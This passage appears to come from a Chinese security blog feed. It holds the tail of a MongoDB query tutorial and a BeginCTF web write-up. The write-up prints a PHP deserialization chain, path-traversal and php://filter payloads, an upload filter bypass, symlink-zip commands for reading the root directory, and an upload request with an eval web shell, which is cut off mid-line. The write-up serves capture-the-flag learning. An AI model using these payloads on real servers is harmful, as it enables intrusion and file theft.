ObjectId(&quot;60fa854cf8aaaf4f21049148&quot;),</span><br><span class="line">    &quot;name&quot; : &quot;whoami&quot;,</span><br><span class="line">    &quot;description&quot; : &quot;the admin user&quot;,</span><br><span class="line">    &quot;age&quot; : <span class="number">21</span>,</span><br><span class="line">    &quot;status&quot; : &quot;A&quot;,</span><br><span class="line">    &quot;groups&quot; : [</span><br><span class="line">        &quot;admins&quot;,</span><br><span class="line">        &quot;users&quot;</span><br><span class="line">    ]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="查询文档"><a href="#查询文档" class="headerlink" title="查询文档"></a>查询文档</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">db.collection.find(query, projection)</span><br><span class="line">query：可选，使用查询操作符指定查询条件，相当于 <span class="keyword">sql</span> <span class="keyword">select</span> 语句中的 <span class="keyword">where</span> 子句。</span><br><span class="line">projection：可选，使用投影操作符指定返回的键。</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">&gt;</span>db.all_users.find(&#123;<span class="string">&#x27;age&#x27;</span>:<span class="number">20</span>&#125;)</span><br><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    _id: ObjectId(<span class="string">&#x27;65bbc283f0e284c714c16a06&#x27;</span>),</span><br><span class="line">    name: <span class="string">&#x27;whoami&#x27;</span>,</span><br><span class="line">    description: <span class="string">&#x27;the admin user&#x27;</span>,</span><br><span class="line">    age: <span class="number">20</span>,</span><br><span class="line">    status: <span class="string">&#x27;A&#x27;</span>,</span><br><span class="line">    <span class="keyword">groups</span>: [ <span class="string">&#x27;admins&#x27;</span>, <span class="string">&#x27;users&#x27;</span> ]</span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h3 id="MongoDB-与-RDBMS-Where-语句的比较"><a href="#MongoDB-与-RDBMS-Where-语句的比较" class="headerlink" title="MongoDB 与 RDBMS Where 语句的比较"></a>MongoDB 与 RDBMS Where 语句的比较</h3><p>如果你熟悉常规的 SQL 数据，通过下表可以更好的理解 MongoDB 的条件语句查询：</p><table><thead><tr><th>操作</th><th>格式</th><th>范例</th><th>RDBMS 中的类似语句</th></tr></thead><tbody><tr><td>等于</td><td><code>&#123;&lt;key&gt;:&lt;value&gt;&#125;</code></td><td><code>db.love.find(&#123;&quot;name&quot;:&quot;whoami&quot;&#125;).pretty()</code></td><td><code>where name = &#39;whoami&#39;</code></td></tr><tr><td>小于</td><td><code>&#123;&lt;key&gt;:&#123;$lt:&lt;value&gt;&#125;&#125;</code></td><td><code>db.love.find(&#123;&quot;age&quot;:&#123;$lt:19&#125;&#125;).pretty()</code></td><td><code>where age &lt; 19</code></td></tr><tr><td>小于或等于</td><td><code>&#123;&lt;key&gt;:&#123;$lte:&lt;value&gt;&#125;&#125;</code></td><td><code>db.love.find(&#123;&quot;age&quot;:&#123;$lte:19&#125;&#125;).pretty()</code></td><td><code>where likes &lt;= 19</code></td></tr><tr><td>大于</td><td><code>&#123;&lt;key&gt;:&#123;$gt:&lt;value&gt;&#125;&#125;</code></td><td><code>db.love.find(&#123;&quot;age&quot;:&#123;$gt:19&#125;&#125;).pretty()</code></td><td><code>where likes &gt; 19</code></td></tr><tr><td>大于或等于</td><td><code>&#123;&lt;key&gt;:&#123;$gte:&lt;value&gt;&#125;&#125;</code></td><td><code>db.love.find(&#123;&quot;age&quot;:&#123;$gte:19&#125;&#125;).pretty()</code></td><td><code>where likes &gt;= 19</code></td></tr><tr><td>不等于</td><td><code>&#123;&lt;key&gt;:&#123;$ne:&lt;value&gt;&#125;&#125;</code></td><td><code>db.love.find(&#123;&quot;age&quot;:&#123;$ne:19&#125;&#125;).pretty()</code></td><td><code>where likes != 19</code></td></tr></tbody></table><h3 id="AND"><a href="#AND" class="headerlink" title="AND"></a>AND</h3><p>在MongDB中 逗号就相当于AND</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.all_users.find(&#123;&quot;status&quot;:&quot;A&quot;, &quot;age&quot;:<span class="number">20</span>&#125;)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240202003723359.png" alt="image-20240202003723359"></p><h3 id="OR"><a href="#OR" class="headerlink" title="OR"></a>OR</h3><p>语法</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">&gt;</span> db.col.find(</span><br><span class="line">   &#123;</span><br><span class="line">      $<span class="keyword">or</span>: [</span><br><span class="line">         &#123;key1: value1&#125;, &#123;key2:value2&#125;</span><br><span class="line">      ]</span><br><span class="line">   &#125;</span><br><span class="line">).pretty()</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">&gt;</span>db.all_users.find(</span><br><span class="line">&#123;</span><br><span class="line">$<span class="keyword">or</span>: [</span><br><span class="line">&#123;&quot;age&quot;:<span class="number">20</span>&#125;, &#123;&quot;status&quot;:&quot;B&quot;&#125;</span><br><span class="line">]</span><br><span class="line">&#125;</span><br><span class="line">)</span><br><span class="line">输出:</span><br><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    _id: ObjectId(<span class="string">&#x27;65bbc283f0e284c714c16a06&#x27;</span>),</span><br><span class="line">    name: <span class="string">&#x27;whoami&#x27;</span>,</span><br><span class="line">    description: <span class="string">&#x27;the admin user&#x27;</span>,</span><br><span class="line">    age: <span class="number">20</span>,</span><br><span class="line">    status: <span class="string">&#x27;A&#x27;</span>,</span><br><span class="line">    <span class="keyword">groups</span>: [ <span class="string">&#x27;admins&#x27;</span>, <span class="string">&#x27;users&#x27;</span> ]</span><br><span class="line">  &#125;</span><br><span class="line">]</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="AND与OR联合"><a href="#AND与OR联合" class="headerlink" title="AND与OR联合"></a>AND与OR联合</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.all_users.find(&#123;&quot;age&quot;:&#123;$gt:<span class="number">19</span>&#125;, $<span class="keyword">or</span>: [&#123;&quot;name&quot;:&quot;whoami&quot;&#125;, &#123;&quot;status&quot;:&quot;A&quot;&#125;]&#125;)</span><br></pre></td></tr></table></figure><p>这相当于</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">where</span> age <span class="operator">&gt;</span> <span class="number">19</span> <span class="keyword">AND</span> (name<span class="operator">=</span><span class="string">&#x27;whoami&#x27;</span> <span class="keyword">OR</span> status<span class="operator">=</span><span class="string">&#x27;A&#x27;</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> nosql注入 </tag>
            
            <tag> MongoDB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BeginCTF（自由赛道）</title>
      <link href="/2024/01/31/BeginCTF-%E8%87%AA%E7%94%B1%E8%B5%9B%E9%81%93/"/>
      <url>/2024/01/31/BeginCTF-%E8%87%AA%E7%94%B1%E8%B5%9B%E9%81%93/</url>
      
        <content type="html"><![CDATA[<h1 id="BeginCTF（自由赛道）"><a href="#BeginCTF（自由赛道）" class="headerlink" title="BeginCTF（自由赛道）"></a>BeginCTF（自由赛道）</h1><h2 id="POPgadget"><a href="#POPgadget" class="headerlink" title="POPgadget"></a>POPgadget</h2><p>exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fun</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$func</span> = <span class="string">&#x27;call_user_func_array&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">getenv</span>(<span class="string">&quot;FLAG&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;serialize me?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$nacl</span> = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="variable">$nacl</span>-&gt;p = <span class="string">&#x27;phpinfo&#x27;</span>;</span><br><span class="line"><span class="variable">$nacl</span>-&gt;a = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$nacl</span>-&gt;a-&gt;a = <span class="keyword">new</span> <span class="title class_">Fun</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$nacl</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>比较简单</p><p>需要注意的是类<code>B</code>下面是没有a属性的,但是不影响解题(由于php特性,反序列化后会自动添加类中不存在而序列中存在的属性)</p><h2 id="zupload"><a href="#zupload" class="headerlink" title="zupload"></a>zupload</h2><p>直接上payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action=../../../../flag</span><br></pre></td></tr></table></figure><h2 id="zupload-pro"><a href="#zupload-pro" class="headerlink" title="zupload-pro"></a>zupload-pro</h2><p>源码中禁止出现<code>..</code>和<code>/</code></p><p>我们用伪协议读取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action=php://filter/read/convert.base64-encode/resource=/flag</span><br></pre></td></tr></table></figure><h2 id="zupload-pro-plus"><a href="#zupload-pro-plus" class="headerlink" title="zupload-pro-plus"></a>zupload-pro-plus</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&#x27;GET&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>])) &#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: /?action=upload&#x27;</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>][<span class="number">0</span>] === <span class="string">&#x27;/&#x27;</span> || <span class="title function_ invoke__">strpos</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>], <span class="string">&#x27;..&#x27;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;&lt;h1&gt;Invalid action&lt;/h1&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>]));</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_tmp</span> = <span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_size</span> = <span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_error</span> = <span class="variable">$file</span>[<span class="string">&#x27;error&#x27;</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$file_name</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>[<span class="number">1</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$allowed</span> = <span class="keyword">array</span>(<span class="string">&#x27;zip&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$allowed</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$file_error</span> === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$file_size</span> &lt;= <span class="number">2097152</span>) &#123;</span><br><span class="line">                <span class="variable">$file_destination</span> = <span class="string">&#x27;uploads/&#x27;</span> . <span class="variable">$file_name</span>;</span><br><span class="line">    </span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$file_tmp</span>, <span class="variable">$file_destination</span>)) &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(</span><br><span class="line">                        <span class="string">&#x27;status&#x27;</span> =&gt; <span class="string">&#x27;ok&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;File uploaded successfully&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;url&#x27;</span> =&gt; <span class="title function_ invoke__">preg_split</span>(<span class="string">&#x27;/\?/&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>])[<span class="number">0</span>] . <span class="variable">$file_destination</span></span><br><span class="line">                    ));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;status&#x27;</span> =&gt; <span class="string">&#x27;error&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;Only zip files are allowed&#x27;</span></span><br><span class="line">        ));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>观察附件中的源码,容易发现以下地方存在漏洞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$file_name</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>[<span class="number">1</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$allowed</span> = <span class="keyword">array</span>(<span class="string">&#x27;zip&#x27;</span>);</span><br></pre></td></tr></table></figure><p>只需要构造一个文件名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell.zip.php</span><br></pre></td></tr></table></figure><p>经处理后得到的<code>$file_ext</code>值为’zip’,但是此文件名将会被解析为php</p><p>注: 前端不允许.php结尾,只需要将.zip后缀的文件代理到burpsuite之后改为.zip.php即可</p><h2 id="zupload-pro-plus-max"><a href="#zupload-pro-plus-max" class="headerlink" title="zupload-pro-plus-max"></a>zupload-pro-plus-max</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&#x27;GET&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>])) &#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: /?action=upload&#x27;</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>][<span class="number">0</span>] === <span class="string">&#x27;/&#x27;</span> || <span class="title function_ invoke__">substr_count</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>], <span class="string">&#x27;/&#x27;</span>) &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;&lt;h1&gt;Invalid action&lt;/h1&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">die</span>(<span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>]));</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_tmp</span> = <span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_size</span> = <span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_error</span> = <span class="variable">$file</span>[<span class="string">&#x27;error&#x27;</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$file_name</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">end</span>(<span class="variable">$file_ext</span>));</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$allowed</span> = <span class="keyword">array</span>(<span class="string">&#x27;zip&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$allowed</span>) &amp;&amp; (<span class="keyword">new</span> <span class="title class_">ZipArchive</span>())-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$file_tmp</span>) === <span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$file_error</span> === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$file_size</span> &lt;= <span class="number">2097152</span>) &#123;</span><br><span class="line">                <span class="variable">$file_destination</span> = <span class="string">&#x27;uploads/&#x27;</span> . <span class="variable">$file_name</span>;</span><br><span class="line">    </span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$file_tmp</span>, <span class="variable">$file_destination</span>)) &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(</span><br><span class="line">                        <span class="string">&#x27;status&#x27;</span> =&gt; <span class="string">&#x27;ok&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;File uploaded successfully&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;url&#x27;</span> =&gt; <span class="title function_ invoke__">preg_split</span>(<span class="string">&#x27;/\?/&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>])[<span class="number">0</span>] . <span class="variable">$file_destination</span></span><br><span class="line">                    ));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;status&#x27;</span> =&gt; <span class="string">&#x27;error&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;Only zip files are allowed&#x27;</span></span><br><span class="line">        ));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>验证文件名最后一个<code>.</code>后的后缀名是否为zip, 增加了zip文件的有效性验证,并将file_get_contents改为include函数</p><p>只需要将恶意php文件压缩为zip,然后直接包含zip文件即可</p><p>include会将zip文件解析为php</p><p>poc:</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240131225145500.png" alt="image-20240131225145500"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240131225218914.png" alt="image-20240131225218914"></p><h2 id="zupload-pro-plus-max-ultra"><a href="#zupload-pro-plus-max-ultra" class="headerlink" title="zupload-pro-plus-max-ultra"></a>zupload-pro-plus-max-ultra</h2><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240201153444529.png" alt="image-20240201153444529"></p><h2 id="zupload-pro-plus-max-ultra-premium"><a href="#zupload-pro-plus-max-ultra-premium" class="headerlink" title="zupload-pro-plus-max-ultra-premium"></a>zupload-pro-plus-max-ultra-premium</h2><p>传软链接的压缩包</p><p>参考:<a href="https://exp10it.io/2023/05/2023-ciscn-%E5%88%9D%E8%B5%9B-web-writeup/">https://exp10it.io/2023/05/2023-ciscn-%E5%88%9D%E8%B5%9B-web-writeup/</a></p><p>这里试了好几次传完软链接再传shell没成功,php不能被解析只能file_get_contents把php的内容带出来</p><p>实际上根本没必要rce阿,由于知道flag就在&#x2F;flag,直接传个软链接链接到根目录就可以了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ln</span> -s / abc </span><br><span class="line">zip -y abc.zip abc</span><br></pre></td></tr></table></figure><p>之后传入abc.zip,直接访问&#x2F;uploads&#x2F;abc&#x2F;flag即可将flag下载下来</p><h2 id="zupload-pro-revenge"><a href="#zupload-pro-revenge" class="headerlink" title="zupload-pro-revenge"></a>zupload-pro-revenge</h2><p>额额 边简单了</p><p>直接绕过前端对.zip的限制就可以传入php文件</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>101.32.220.189:31393</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://101.32.220.189:31393/?action=upload</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=---------------------------18159431502352910098131068589</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>282</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://101.32.220.189:31393</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-php">-----------------------------<span class="number">18159431502352910098131068589</span></span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&quot;shell.php&quot;</span></span></span><br><span class="line"><span class="language-php">Content-Type: application/x-zip-compressed</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="language-php">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span 